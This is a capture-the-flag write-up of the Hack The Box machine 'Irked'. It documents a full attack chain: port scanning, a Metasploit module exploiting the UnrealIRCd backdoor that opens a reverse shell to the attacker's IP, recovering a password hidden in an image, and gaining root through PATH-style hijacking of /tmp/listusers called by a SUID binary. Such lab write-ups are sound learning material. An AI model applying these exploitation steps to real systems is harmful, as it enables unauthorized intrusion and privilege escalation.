# Irked

**Irked** is a medium-difficulty Linux machine from Hack The Box. The machine focuses on service enumeration, identifying a vulnerable IRC service, obtaining an initial shell, discovering hidden information through steganography, and escalating privileges through a vulnerable SUID binary.

**Target IP:** `10.129.80.13`

---

## Overview

| Information          | Details                |
| -------------------- | ---------------------- |
| Machine              | Irked                  |
| Platform             | Linux                  |
| Difficulty           | Medium                 |
| Target IP            | `10.129.80.13`         |
| Initial Access       | UnrealIRCd backdoor    |
| User                 | `djmardov`             |
| Privilege Escalation | SUID `viewuser` binary |
| Root Access          | Successful             |

### Attack Path

```text
Nmap Enumeration
        ↓
UnrealIRCd Identified
        ↓
CVE-2010-2075
        ↓
UnrealIRCd Backdoor
        ↓
Shell as ircd
        ↓
Discover .backup File
        ↓
Steganography Password
        ↓
Extract Password from irked.jpg
        ↓
SSH as djmardov
        ↓
SUID Enumeration
        ↓
/usr/bin/viewuser
        ↓
/tmp/listusers Command Hijacking
        ↓
Root Shell
```

---

# 1. Enumeration

## Nmap Scan

We begin with a full TCP port scan to identify all exposed services.

```bash
nmap -p- --min-rate 1000 10.129.80.13
```

### Results

```text
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63
6697/tcp  open  ircs-u     syn-ack ttl 63
8067/tcp  open  infi-async syn-ack ttl 63
34725/tcp open  unknown    syn-ack ttl 63
65534/tcp open  unknown    syn-ack ttl 63
```

Several interesting services are exposed, particularly the IRC ports.

---

## Service Enumeration

Next, we perform version detection against the discovered ports.

```bash
nmap -sC -sV -p22,80,111,6697,8067,34725,65534 10.129.80.13
```

Important results:

```text
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp    open  http    Apache httpd 2.4.10 (Debian)
111/tcp   open  rpcbind 2-4
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
34725/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
```

The machine is running **multiple UnrealIRCd services**, making the IRC service a strong candidate for further investigation.

---

# 2. IRC Enumeration

We connect to the discovered IRC ports using Netcat.

```bash
nc -vn 10.129.80.13 6697
```

The connection succeeds:

```text
Connection to 10.129.80.13 6697 port [tcp/*] succeeded!
:irked.htb NOTICE AUTH :*** Looking up your hostname...
```

We also test port `8067`:

```bash
nc -vn 10.129.80.13 8067
```

Output:

```text
Connection to 10.129.80.13 8067 port [tcp/*] succeeded!
:irked.htb NOTICE AUTH :*** Looking up your hostname...
```

The IRC services respond with the same hostname:

```text
irked.htb
```

The presence of UnrealIRCd leads us to investigate known vulnerabilities affecting the software.

---

# 3. Initial Foothold

## UnrealIRCd Backdoor

Searching for known UnrealIRCd vulnerabilities reveals **CVE-2010-2075**, a backdoor command injection vulnerability.

Within Metasploit, we search for UnrealIRCd modules:

```text
search unrealircd
```

The relevant module is:

```text
exploit/unix/irc/unreal_ircd_3281_backdoor
```

The module description identifies it as:

```text
UnrealIRCD 3.2.8.1 Backdoor Command Execution
```

We use the module against the target.

```text
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

Running the exploit:

```text
exploit
```

Metasploit successfully connects to the IRC service and sends the backdoor command.

```text
[*] Started reverse TCP double handler on 10.10.15.95:4444
[*] 10.129.80.13:6697 - Connected to 10.129.80.13:6697...
[*] 10.129.80.13:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 1pLBwox7pHV9DuUw;
[*] Command shell session 1 opened
```

We now have a command shell on the target.

Checking our current identity:

```bash
id
```

Output:

```text
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

We have obtained our initial foothold as the `ircd` user.

---

# 4. User Enumeration

After obtaining the shell, we inspect the home directory belonging to `djmardov`.

```bash
cd /home/djmardov
ls
```

Output:

```text
Desktop
Downloads
Pictures
Templates
Videos
Documents
Music
Public
user.txt
```

We attempt to read the user flag:

```bash
cat user.txt
```

However, access is denied:

```text
cat: user.txt: Permission denied
```

We therefore need to discover a way to obtain access as `djmardov`.

---

# 5. Information Disclosure

While enumerating the filesystem, we inspect the `Documents` directory.

```bash
cd /home/djmardov/Documents
ls -lah
```

Output:

```text
total 12K
drwxr-xr-x  2 djmardov djmardov 4.0K Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4.0K Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
```

The `.backup` file looks interesting.

```bash
cat .backup
```

Output:

```text
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

The reference to **steg** suggests that the password may be related to steganography.

---

# 6. Steganography

During web enumeration, an image named `irked.jpg` was available on the target.

Using the password discovered in `.backup`, we attempt to extract hidden data from the image with `steghide`.

```bash
steghide extract -sf irked.jpg
```

We provide the discovered passphrase:

```text
UPupDOWNdownLRlrBAbaSSss
```

The extraction succeeds:

```text
wrote extracted data to "pass.txt".
```

We inspect the extracted file:

```bash
cat pass.txt
```

Output:

```text
Kab6h+m+bbp2J:HG
```

This provides credentials that can be used to access the `djmardov` account.

---

# 7. User Access

Using the discovered credentials, we obtain access as `djmardov`.

We can now read the user flag:

```bash
cat user.txt
```

The user flag is successfully obtained.

---

# 8. Privilege Escalation

With access as `djmardov`, we begin looking for potential privilege escalation paths.

The system contains several SUID binaries, including:

```text
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
```

The unusual binary `/usr/bin/viewuser` stands out and is worth investigating.

---

# 9. Exploiting `viewuser`

We execute the binary:

```bash
/usr/bin/viewuser
```

It displays:

```text
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-09-05 22:01 (:0)
djmardov pts/3        2026-09-05 23:15 (10.10.15.95)
sh: 1: /tmp/listusers: not found
```

The important part is:

```text
sh: 1: /tmp/listusers: not found
```

The binary is attempting to execute:

```text
/tmp/listusers
```

If we can create this file, we may be able to control what the SUID program executes.

---

## Creating `/tmp/listusers`

We create a file containing a shell:

```bash
printf '/bin/sh' > /tmp/listusers
```

Then make it executable:

```bash
chmod a+x /tmp/listusers
```

We execute `viewuser` again:

```bash
/usr/bin/viewuser
```

This time, a shell is spawned.

Checking our identity:

```bash
id
```

Output:

```text
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

The important part is:

```text
uid=0(root)
```

We have successfully escalated to **root**.

---

# 10. Root Access

With root privileges, we can access the root user's desktop and retrieve the root flag.

```bash
cat /root/root.txt
```

The root flag is successfully obtained.

---

# Attack Path Summary

```text
10.129.80.13
      │
      ▼
Full Port Scan
      │
      ├── SSH
      ├── HTTP
      ├── RPC
      └── UnrealIRCd
             │
             ▼
    UnrealIRCd Enumeration
             │
             ▼
      CVE-2010-2075
             │
             ▼
    UnrealIRCd Backdoor
             │
             ▼
       Shell as ircd
             │
             ▼
   /home/djmardov/Documents
             │
             ▼
          .backup
             │
             ▼
 Steganography Password
             │
             ▼
       irked.jpg
             │
             ▼
      Extract pass.txt
             │
             ▼
      Access as djmardov
             │
             ▼
       SUID Enumeration
             │
             ▼
       /usr/bin/viewuser
             │
             ▼
       /tmp/listusers
             │
             ▼
          Root Shell
             │
             ▼
        root.txt
```

---

# Key Takeaways

* Perform a **full port scan** rather than limiting enumeration to common ports.
* Service versions can reveal valuable attack opportunities.
* Multiple instances of the same service should be investigated carefully.
* Files in user directories can contain important clues or credentials.
* Steganography can be used to hide sensitive information inside seemingly harmless files.
* SUID binaries should always be reviewed during Linux privilege escalation.
* Unexpected execution of files from writable locations can provide a significant privilege escalation opportunity.
* Always verify the current user with `id` after successful exploitation or privilege escalation.

---

# Tools Used

| Tool                 | Purpose                                |
| -------------------- | -------------------------------------- |
| Nmap                 | Port and service enumeration           |
| Netcat               | IRC service interaction                |
| Metasploit Framework | UnrealIRCd exploitation                |
| LinPEAS              | Local privilege escalation enumeration |
| Steghide             | Extracting hidden data from the image  |
| Linux shell          | System enumeration and exploitation    |

---

# Conclusion

Irked was a great example of how a relatively small amount of exposed information can lead through multiple stages of exploitation.

The attack began with network enumeration and identification of an exposed UnrealIRCd service. After obtaining an initial shell, further filesystem enumeration revealed a backup file containing a clue for extracting hidden information from an image. This provided access to the intended user account.

From there, SUID enumeration exposed the unusual `viewuser` binary. Its interaction with `/tmp/listusers` allowed us to control the command it executed and ultimately obtain a root shell.

The machine demonstrates the importance of **thorough enumeration, following clues, and carefully investigating unusual binaries and file execution behavior** during a penetration test.
